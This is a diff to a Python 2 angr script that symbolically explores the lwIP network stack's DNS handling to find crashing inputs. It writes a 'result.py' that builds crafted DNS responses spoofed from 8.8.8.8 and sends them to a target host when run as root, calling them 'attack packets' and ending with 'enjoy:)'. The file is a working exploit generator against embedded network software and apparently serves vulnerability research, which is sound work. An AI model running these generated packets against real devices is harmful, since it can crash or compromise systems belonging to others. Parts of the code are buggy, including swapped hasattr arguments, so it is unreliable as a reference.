@@ -11,8 +11,18 @@ except ImportError as e:
 import os, sys, signal
 import pickle
 import hexdump
+import time, datetime
 
+### to measure run time
+start_time = time.time()
+
+ANGR_LOG = "angr.log"
 angr.manager.l.setLevel("DEBUG")
+logging = angr.manager.logging
+log_handler = logging.FileHandler(ANGR_LOG, mode='w')
+log_handler.setLevel(logging.DEBUG)
+log_handler.setFormatter(logging.Formatter('%(levelname)-7s | %(asctime)-23s | %(name)-8s | %(message)s'))
+angr.manager.l.addHandler(log_handler)
 
 ### ==================================================================
 TRACE_SAVE_DIR = "./trace/"
@@ -46,6 +56,20 @@ def plot_trace():
                 # plain_file=TRACE_SAVE_DIR + "avoid-%d.txt" % i
                 )
             if i > 5: break
+    if hasattr(simgr, "threadlocal"):
+        for (i, x) in enumerate(simgr.threadlocal):
+            dot_file = TRACE_SAVE_DIR + "threadlocal-%d.dot" % i
+            helper(proj, x.state, dot_file,
+                # plain_file=TRACE_SAVE_DIR + "avoid-%d.txt" % i
+                )
+            if i > 5: break
+    if hasattr(simgr, "deferred"):
+        for (i, x) in enumerate(simgr.deferred):
+            dot_file = TRACE_SAVE_DIR + "deferred-%d.dot" % i
+            helper(proj, x.state, dot_file,
+                # plain_file=TRACE_SAVE_DIR + "avoid-%d.txt" % i
+                )
+            if i >= 9: break
     for (i, ddd) in enumerate(simgr.deadended):
         dot_file = TRACE_SAVE_DIR + "deadended-%d.dot" % i
         helper(proj, ddd.state, dot_file)
@@ -97,6 +121,18 @@ def memory_dump(state, begin, length):
 def sizeof(symbol_name):
     global info
     return info.symbols[symbol_name].size
+
+def dhms(t):
+    orig = t
+    t = int(t)
+    d = t / (24 * 3600)
+    t -= d * 24 * 3600
+    h = t / 3600
+    t -= h * 3600
+    m = t / 60
+    t -= m * 60
+    s = t % 60
+    return "{}:{}:{}:{} ({:.3f}s)".format(d, h, m, s, orig)
 
 def usage():
     print "usage: %s START_FUNC_NAME" % (sys.argv[0])
@@ -186,8 +222,8 @@ try:
         "__printf_chk", # ??
         "inet_chksum_pseudo", # checksum check
         "inet_chksum_pseudo_partial",
+        "tcp_rst",
         # "tcp_process", # tcp state machine
-        # "pbuf_free",
         "sys_arch_protect", "sys_arch_unprotect", # SYS_ARCH_PROTECT, SYS_ARCH_UNPROTECT
         "sys_arch_sem_wait",
         ]
@@ -284,8 +320,8 @@ gdb-peda$ x/12wx p->payload
 0x61f7d2 <memp_memory+8978>:    0x01000100  0x00000000  0x007f0400  0x000c0100
 """
 state.add_constraints(LittleEndian(state.se.Extract(8 * 4 - 1, 8 * 0, symvar_pbuf_payload)) == 0x80810000)
-# state.add_constraints(LittleEndian(state.se.Extract(8 * 8 - 1, 8 * 4, symvar_pbuf_payload)) == 0x02000100) # Answer RRs = 2
-state.add_constraints(LittleEndian(state.se.Extract(8 * 8 - 1, 8 * 4, symvar_pbuf_payload)) == 0xff000100) # Answer RRs
+state.add_constraints(LittleEndian(state.se.Extract(8 * 8 - 1, 8 * 4, symvar_pbuf_payload)) == 0xff000100) # Answer RRs = 0xff
+# state.add_constraints(LittleEndian(state.se.Extract(8 * 8 - 1, 8 * 4, symvar_pbuf_payload)) > 0x01000100) # Answer RRs
 state.add_constraints(LittleEndian(state.se.Extract(8 * 12 - 1, 8 * 8, symvar_pbuf_payload)) == 0)
 state.add_constraints(LittleEndian(state.se.Extract(8 * 16 - 1, 8 * 12, symvar_pbuf_payload)) == 0x77777703)
 state.add_constraints(LittleEndian(state.se.Extract(8 * 20 - 1, 8 * 16, symvar_pbuf_payload)) == 0x6f6f6706)
@@ -298,7 +334,7 @@ state.add_constraints(LittleEndian(state.se.Extract(8 * 44 - 1, 8 * 40, symvar_p
 state.add_constraints(LittleEndian(state.se.Extract(8 * 48 - 1, 8 * 44, symvar_pbuf_payload)) == 0x006d6f63)
 state.add_constraints(LittleEndian(state.se.Extract(8 * 52 - 1, 8 * 48, symvar_pbuf_payload)) == 0x01000100)
 state.add_constraints(LittleEndian(state.se.Extract(8 * 56 - 1, 8 * 52, symvar_pbuf_payload)) == 0)
-# state.add_constraints(LittleEndian(state.se.Extract(8 * 60 - 1, 8 * 56, symvar_pbuf_payload)) == 0x007f0400)
+state.add_constraints(LittleEndian(state.se.Extract(8 * 60 - 1, 8 * 56, symvar_pbuf_payload)) >= 0x007f0400)
 state.add_constraints(LittleEndian(state.se.Extract(8 * 60 - 1, 8 * 56, symvar_pbuf_payload)) == 0x007fffff)
 state.add_constraints(LittleEndian(state.se.Extract(8 * 64 - 1, 8 * 60, symvar_pbuf_payload)) == 0x000c0100)
 state.memory.store(pbuf_payload, state.se.Reverse(symvar_pbuf_payload))
@@ -550,16 +586,15 @@ if dns:
     symvar_dns_table = state.se.BVS('dns_table', 8 * sizeof_dns_table)
     print "[*] sizeof(dns_table) = %#x" % (sizeof_dns_table)
     ### set content of dns_table[0]
-    # state.add_constraints(NoReverse(state.se.Extract(8 * 4 - 1, 8 * 0, symvar_dns_table)) == 0x00010002)
-    state.add_constraints(NoReverse(state.se.Extract(8 * 4 - 1, 8 * 0, symvar_dns_table)) > 0)
+    state.add_constraints(NoReverse(state.se.Extract(8 * 4 - 1, 8 * 0, symvar_dns_table)) == 0x00010002)
     state.add_constraints(NoReverse(state.se.Extract(8 * 8 - 1, 8 * 4, symvar_dns_table)) == 0)
     state.add_constraints(NoReverse(state.se.Extract(8 * 12 - 1, 8 * 8, symvar_dns_table)) == 0x77770000)
     state.add_constraints(NoReverse(state.se.Extract(8 * 16 - 1, 8 * 12, symvar_dns_table)) == 0x6f672e77)
     state.add_constraints(NoReverse(state.se.Extract(8 * 20 - 1, 8 * 16, symvar_dns_table)) == 0x656c676f)
     state.add_constraints(NoReverse(state.se.Extract(8 * 24 - 1, 8 * 20, symvar_dns_table)) == 0x6d6f632e)
-    state.add_constraints(NoReverse(state.se.Extract(8 * 268 - 1, 8 * 24, symvar_dns_table)) == 0)
-    state.add_constraints(NoReverse(state.se.Extract(8 * 272 - 1, 8 * 268, symvar_dns_table)) == 0x15a60000) # found
-    state.add_constraints(NoReverse(state.se.Extract(8 * 276 - 1, 8 * 272, symvar_dns_table)) == 0x00000040) # found
+    state.add_constraints(NoReverse(state.se.Extract(8 * 270 - 1, 8 * 24, symvar_dns_table)) == 0)
+    state.add_constraints(NoReverse(state.se.Extract(8 * 273 - 1, 8 * 270, symvar_dns_table)) == rebased_addr('dns_found')) # found
+    state.add_constraints(NoReverse(state.se.Extract(8 * 276 - 1, 8 * 273, symvar_dns_table)) == 0) # found
     state.add_constraints(NoReverse(state.se.Extract(8 * sizeof_dns_table_entry - 1, 8 * 276, symvar_dns_table)) == 0)
     ### spill out dns_table[1] ... dns_table[DNS_TABLE_SIZE]
     state.add_constraints(state.se.Extract(symvar_dns_table.size() - 1, 8 * sizeof_dns_table_entry, symvar_dns_table) == 0)
@@ -615,6 +650,16 @@ if dns:
 ### load initial state to engine (Simulation Manager)
 simgr = proj.factory.simgr(state)
 
+### use exploration techniques
+THREADING = True
+THREADING = False
+DEPTH_FIRST = True
+# DEPTH_FIRST = False
+if THREADING:
+    simgr.use_technique(angr.exploration_techniques.Threading(4)) # cause segmentation fault
+elif DEPTH_FIRST:
+    simgr.use_technique(angr.exploration_techniques.DFS())
+
 ### setup avoids
 find, avoid = [], []
 ### pbuf_free() means return of dns_recv()
@@ -629,18 +674,54 @@ print "[*] avoid = %s" % str(map(lambda x: hex(x), avoid))
 # proj.hook(0x400000 + 0x1c730, dump_regs, length=4)
 # proj.hook(0x400000 + 0x1cecf, dump_regs, length=5)
 
+import random
+random = random.Random()
+random.seed(10)
 def step_func(lpg):
-    global find, avoid
-    if find is not []:
-        lpg.stash(filter_func=lambda path: path.addr in find, from_stash='active', to_stash='found')
-    if avoid is not []:
-        lpg.stash(filter_func=lambda path: path.addr in avoid, from_stash='active', to_stash='avoid')
-    lpg.drop(stash='avoid') # memory usage optimization
+    global find, avoid, THREADING, DEPTH_FIRST, random
+    if THREADING:
+        if find is not []:
+            lpg.stash(filter_func=lambda path: path.addr in find, from_stash='active', to_stash='found')
+            lpg.stash(filter_func=lambda path: path.addr not in find, from_stash='threadlocal', to_stash='active')
+        else:
+            lpg.stash(filter_func=lambda path: True, from_stash='threadlocal', to_stash='active')
+        if avoid is not []:
+            lpg.stash(filter_func=lambda path: path.addr in avoid, from_stash='active', to_stash='avoid')
+            lpg.stash(filter_func=lambda path: path.addr not in avoid, from_stash='threadlocal', to_stash='active')
+        pass
+    else:
+        if find is not []:
+            lpg.stash(filter_func=lambda path: path.addr in find, from_stash='active', to_stash='found')
+        if avoid is not []:
+            lpg.stash(filter_func=lambda path: path.addr in avoid, from_stash='active', to_stash='avoid')
+        lpg.drop(stash='avoid') # memory usage optimization
+    # print "[*] len(lpg.active) = %d" % (len(lpg.active))
+    if DEPTH_FIRST:
+        if len(lpg.active) == 0 and len(lpg.deferred) > 0:
+            random.shuffle(lpg.deferred)
+            lpg.split(from_stash='deferred', to_stash='active', limit=1)
+    if THREADING:
+        if len(lpg.active) == 0 and len(lpg.threadlocal) > 0:
+            lpg.split(from_stash='threadlocal', to_stash='active', limit=1)
     return lpg
 
+def until_func(lpg):
+    if len(lpg.errored) > 0:
+        return True
+    if len(lpg.active) == 0:
+        print "[*] out of active stashes"
+        if hasattr('threadlocal', lpg):
+            return len(lpg.threadlocal) == 0
+        if hasattr('deferred', lpg):
+            return len(lpg.deferred) == 0
+
 ### explore bugs
-simgr.step(step_func=step_func, until=lambda x: len(x.errored) > 0) # explore until error occurs (or active stashes exhausts)
+simgr.step(step_func=step_func, until=until_func) # explore until error occurs (or active stashes exhausts)
 print "[*] explore finished!!"
+
+print "[*] mode:"
+print "\tTHREADING = %r" % (THREADING)
+print "\tDEPTH_FIRST = %r" % (DEPTH_FIRST)
 
 # if len(simgr.errored) > 0:
 #     print "[*] analysis succeeded!"
@@ -654,11 +735,17 @@ print "[*] explore finished!!"
 #     print "errored #%d: pbuf->payload:" % (i)
 #     hexdump.hexdump(v)
 
+RESULT_PY = "result.py"
+RESULT_TXT = "result.txt"
+print "[*] saving result to %s" % (RESULT_TXT)
+ftxt = open(RESULT_TXT, 'w')
+fout = sys.stdout
+sys.stdout = ftxt # redirect to a file
 if len(simgr.found) > 0 or len(simgr.errored) > 0:
     plot_trace()
     ### save results
     result = open("result.py", "w")
-    result.write("""#!/usr/bin/python
+    result.write("""#!/usr/bin/python2
 import sys
 import pickle
 try:
@@ -667,6 +754,7 @@ except ImportError:
     print("[!] `pip install scapy` first! exit.")
     exit(1)
 
+### ==================================================================
 def usage():
     cmd_name = sys.argv[0]
     print("usage: [sudo] %s [PACKET_NO]" % cmd_name)
@@ -708,11 +796,12 @@ if len(sys.argv) == 2:
         usage()
     PACKET_NO = int(sys.argv[1])
 if PACKET_NO > 0 and not IS_ROOT:
-    print "[!] you must be _root_ to send packet! exit."
+    print("[!] you must be _root_ to send packet! exit.")
     exit(1)
 if IS_ROOT and PACKET_NO == -1:
-    print "[!] specify packet no"
+    print("[!] specify packet no")
     usage()
+### ==================================================================
 """)
     ###
     num_founds = len(simgr.found)
@@ -747,11 +836,13 @@ if {ip!r}: # is IP packet?
     p = IP(_pkt=v[:l2_payload_len])
 elif {etharp!r}: # is Ether packet?
     p = Ether(_pkt=v[:l2_payload_len])
-# p[IP].ttl = 64
-# p[IP].window = 8192
 
 recalc_chksums(p)
-p.show()
+try:
+    p.show2()
+except Exception as e:
+    print(e)
+    print("p.show() errored.")
 b = bytes(p)[:l2_payload_len] # trim unused padding
 
 if IS_ROOT and PACKET_NO == {no:d}: # send mode
@@ -772,6 +863,9 @@ else: # preview mode
     ###
     for i, errored in enumerate(simgr.errored):
         se = errored.state.plugins['solver_engine']
+        posix = errored.state.plugins['posix']
+        print "errored #%d: stdout:\n%s" % (i, posix.dumps(1))
+        print "errored #%d: stderr:\n%r" % (i, posix.dumps(2))
         payload_len = se.eval(symvar_pbuf_tot_len)
         print "errored #{0:d}: pbuf->tot_len: {1:#x} ({1:d})".format(i, payload_len)
         v = se.eval(se.Reverse(symvar_pbuf_payload), cast_to=str)[:payload_len]
@@ -784,10 +878,15 @@ print("found #{no:d}: pbuf.payload:")
 payload_len = {len:}
 v = pickle.loads({dump!r})
 v = v[:payload_len] # trim unused padding
-p = IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=0x1000)/{layer!s}(_pkt=v) # FIXME: dport must be corrected
+# p = IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=0x1000)/{layer!s}(_pkt=v) # FIXME: dport must be corrected
+p = IP(src="8.8.8.8", dst="192.168.0.2")/UDP(sport=53, dport=0x1000)/Raw(v) # FIXME: dport must be corrected
 
-# recalc_chksums(p)
-p.show()
+recalc_chksums(p)
+try:
+    p.show2()
+except Exception as e:
+    print(e)
+    print("p.show() errored.")
 b = bytes(p)[:payload_len]
 
 if IS_ROOT and PACKET_NO == {no:d}: # send mode
@@ -801,20 +900,58 @@ else: # preview mode
     hexdump(b)
     pass
 """.format(no=(i + num_founds), dump=pickle.dumps(v), len=payload_len, ip=ip, layer="DNS"))
-        hexdump.hexdump(v)
     ### the end of iteration
     result.close()
     print ""
-    print "[*] attack packets are saved to result.py."
-
-    ### print final result (this can be comment outed)
-    print ""
-    print "[*] preview of attack packets"
-    os.system("python2 result.py")
-    os.system("chmod +x result.py")
+    print "[*] attack packets are saved to %s." % (RESULT_PY)
 else:
     print "[!] no outcomes;("
     if len(simgr.avoid) > 0 or len(simgr.deadended) > 0:
         plot_trace()
+sys.stdout = fout # re-enable stdout
+ftxt.close()
+### print final result if exists (this can be comment outed)
+os.system("if [ -e {py} ]; then (echo; echo '[*] preview of attack packets'; python2 {py}) >> {txt}; fi".format(py=RESULT_PY, txt=RESULT_TXT))
+os.system("cat %s" % (RESULT_TXT)) # print solver script message
+
+### end measurement
+run_time = time.time() - start_time
+cpu_time = time.clock() # < python 3.3
+
+### save files to output directory
+OUTPUT_DIR = "./output-last/"
+os.system("if [ ! -d {dir} ]; then mkdir {dir}; else rm -rf {dir}/*; fi".format(dir=OUTPUT_DIR))
+os.system("cp {_from!s} {_to!s}".format(_from=sys.argv[0], _to=OUTPUT_DIR)) # this solver script
+for x in [RESULT_TXT, RESULT_PY, ANGR_LOG, TRACE_SAVE_DIR]:
+    os.system("mv {_from!s} {_to!s}".format(_from=x, _to=OUTPUT_DIR))
+print "[*] output files are saved to {!s}".format(OUTPUT_DIR)
+
+### write README
+README = OUTPUT_DIR + "README.txt"
+with open(README, "w") as f:
+    f.write("""README: About this output directory\n
+Executed at:
+    {date}
+
+Run command:
+    % {cmd!s}
+
+Run time (Hour:Min:Sec):
+    {run_time}, cpu: {cpu_time}
+
+Run result:
+    ./{txt}
+
+Attacker script:
+    ./{py}
+
+angr debug log:
+    ./{log}
+
+Trace (state history):
+    ./trace
+""".format(date=datetime.datetime.today().strftime("%Y/%m/%d %H:%M:%S"),
+    cmd=' '.join(sys.argv), run_time=dhms(run_time), cpu_time=dhms(cpu_time),
+    txt=RESULT_TXT, py=RESULT_PY, log=ANGR_LOG))
 
 ### you can send generated packets with result.py. enjoy:)
